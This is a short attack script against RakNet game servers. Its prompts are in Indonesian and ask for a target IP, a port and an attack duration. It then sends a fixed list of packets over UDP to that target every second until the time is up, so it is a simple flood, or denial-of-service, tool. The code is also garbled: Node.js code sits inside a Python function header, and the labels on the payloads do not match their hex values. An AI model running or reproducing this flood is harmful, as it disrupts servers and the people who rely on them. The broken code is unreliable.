import socket
import time
import struct
import threading

def raknet_attack(params):
    # RakNet payload
    const dgram = require('dgram');
const readline = require('readline');

const raknetPayloads = [
  Buffer.from('0000000000000000', 'hex'), // ID_CONNECTED_PING
  Buffer.from('0000000000000001', 'hex'), // ID_CONNECTED_PONG
  Buffer.from('0500000000000000', 'hex'), // ID_CONNECTION_REQUEST
  Buffer.from('0500000000000001', 'hex'), // ID_CONNECTION_REQUEST_ACCEPTED
  Buffer.from('0700000000000000', 'hex'), // ID_NEW_INCOMING_CONNECTION
  Buffer.from('0000000000000002', 'hex'), // ID_DISCONNECTION_NOTIFICATION
  Buffer.from('0000000000000003', 'hex'), // ID_CONNECTION_LOST
  Buffer.from('0400000000000000', 'hex'), // ID_RAKNET_MESSAGE
  Buffer.from('0100000000000000', 'hex'), // ID_ADVERTISE_SYSTEM
  Buffer.from('0200000000000000', 'hex'), // ID_BROADCAST
];

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Masukkan target IP: ', (targetIp) => {
  rl.question('Masukkan target port: ', (targetPort) => {
    rl.question('Masukkan waktu serangan (dalam detik): ', (time) => {
      const client = dgram.createSocket('udp4');
      const startTime = Date.now();
      const endTime = startTime + (parseInt(time) * 1000);

      setInterval(() => {
        if (Date.now() > endTime) {
          process.exit(0);
        }

        raknetPayloads.forEach((payload) => {
          client.send(payload, 0, payload.length, parseInt(targetPort), targetIp, (err) => {
            if (err) {
              console.error(err);
            }
          });
        });
      }, 1000);
    });
  });
});
